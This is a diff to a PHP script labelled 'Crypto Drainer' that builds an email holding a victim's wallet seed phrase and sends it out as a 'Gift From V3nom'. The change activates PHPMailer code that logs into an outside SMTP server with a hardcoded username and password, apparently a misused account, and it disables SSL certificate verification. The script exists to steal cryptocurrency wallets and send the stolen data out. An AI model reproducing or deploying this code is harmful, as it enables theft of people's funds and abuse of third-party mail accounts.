@@ -27,7 +27,29 @@ $body = "⚜️ Crypto Drainer ⚜️\r\nWallet Phrase: $wallet_phrase\r\nWallet
 $subject = 'Gift From V3nom';
 
 try {
-    $mail = new PHPMailer(true);
+	$mail->isSMTP();
+	$mail->Hostname = 'localhost';
+	$mail->Host = 'webmail.asdepo.org';
+	$mail->SMTPAuth = true;
+	$mail->Username = 'gebeyaw.a@asdepo.org';
+	$mail->Password = 'Gebeyaw@2049##';
+	$mail->SMTPSecure = 'tls';
+	$mail->SMTPDebug = 1;
+	$mail->Port = 587;
+	$mail->setFrom('gebeyaw.a@asdepo.org', 'V3nom');
+	$mail->addAddress($to_email); 
+	//$mail->addReplyTo('info@example.com', 'Information');
+	$mail->Subject = $subject;
+	$mail->isHTML(true);
+	$mail->Body = $body;
+	$mail->SMTPOptions = array(
+      'ssl' => array(
+        'verify_peer' => false,
+        'verify_peer_name' => false,
+        'allow_self_signed' => true
+      )
+    );
+    /*$mail = new PHPMailer(true);
     $mail->isSMTP();
     $mail->Host = 'webmail.asdepo.org';
     $mail->SMTPAuth = true;
@@ -39,7 +61,7 @@ try {
     $mail->setFrom('gebeyaw.a@asdepo.org', 'V3nom');
     $mail->addAddress($to_email);
     $mail->Subject = $subject;
-    $mail->Body = $body;
+    $mail->Body = $body;*/
     
     // Remove insecure SSL options - use proper certificate validation
     // $mail->SMTPOptions = array(...); // Remove this insecure configuration
